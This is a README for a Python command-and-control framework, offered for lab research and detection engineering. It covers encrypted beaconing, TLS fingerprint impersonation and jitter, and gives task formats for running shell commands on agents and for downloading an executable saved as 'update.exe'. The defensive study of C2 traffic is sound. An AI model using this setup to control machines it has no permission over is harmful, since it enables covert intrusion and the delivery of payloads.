
# Python Command and Control C2 Server
A minimal Command & Control (C2) framework built for **security research, malware analysis labs, and detection engineering experiments**.

This project is designed to help blue teamers and red teamers understand:
- How modern C2 traffic looks
- Which behaviors trigger detection
- How TLS fingerprinting and beacon timing affect network visibility

## Research-Oriented Features

- Encrypted C2 Communication (Fernet / AES)
- TLS Fingerprint Impersonation (curl_cffi)
- Time-based beacon intervals with jitter
- Simple tasking mechanism for lab simulations
- Agent identity persistence for behavior tracking


## Why this project exists
This framework was created as a **learning and research tool**, not as a production-ready malware platform.

Primary goals:
- Study C2 communication patterns
- Experiment with TLS fingerprint impersonation
- Analyze beacon timing and jitter
- Build detection rules in controlled lab environments


## Detection & Defensive Notes

This project can be used to:
- Generate sample encrypted C2 traffic for IDS/IPS testing
- Build SIEM and EDR detection rules
- Analyze TLS JA3 / fingerprint-based detection strategies
- Observe how beacon jitter impacts anomaly-based detection
- Compare predictable vs randomized beacon intervals


## Project Structure
```
.
├── C2.py       # The C2 Server (Flask)
├── Agent.py        # The Client Agent
├── Encryption.py   # Shared encryption logic
├── .env            # Environment file for keys
└── tasks.json      # (Auto-generated) Stores pending tasks
└── agents.json     # (Auto-generated) Stores agent info
```

## Prerequisites

You need Python 3.8+ and the following libraries:

```
pip install flask curl-cffi cryptography python-dotenv request
```

## Setup & Configuration

### 1. Generate Encryption Key

You must generate a Fernet key and save it in a `.env` file. Both the Server and the Agent need access to this logic/key to communicate.

Run this in Python to get a key:
```
from cryptography.fernet import Fernet
print(Fernet.generate_key().decode())
```

Create a `.env` file in the root directory:


```
FERNET_KEY=YOUR_GENERATED_KEY_HERE
```

### 2. Configure the Agent

Open `agent.py` and modify the `SERVER` variable if you are not running locally:
```
SERVER = 'http://127.0.0.1:5000' 
# Change to your C2 IP/Domain
```

## Usage

### 1. Start the Server
```
python server.py
```
The server will listen on `0.0.0.0:5000`.

### 2. Start the Agent


```
python agent.py
```

The agent will register with the server and begin beaconing based on the sleep intervals.

### 3. Queueing Tasks (How to Control Agents)

Currently, tasks are pushed via the `/api/push_task` endpoint. You can use `curl` or Postman to queue a command.

**Example: Encrypt your task payload first**

_Note: Since the server expects encrypted JSON, you need a small helper script to encrypt your command before sending it via curl, or extend the server to accept plain text from an admin interface._

**Task Types:**

1.  **Shell Command:**
 `{"type": "shell", "command": "whoami"}`
    
2.  **Download:** 
`{"type": "download", "url": "http://site.com/file.exe", "save_as": "update.exe"}`
    
3.  **Sleep Update:**
 `{"type": "sleep", "min": 5, "max": 10}`
    


## Disclaimer

This project is strictly for:
- Educational purposes
- Malware analysis labs
- Authorized security research

Do NOT deploy this framework outside environments you own or explicitly have permission to test.

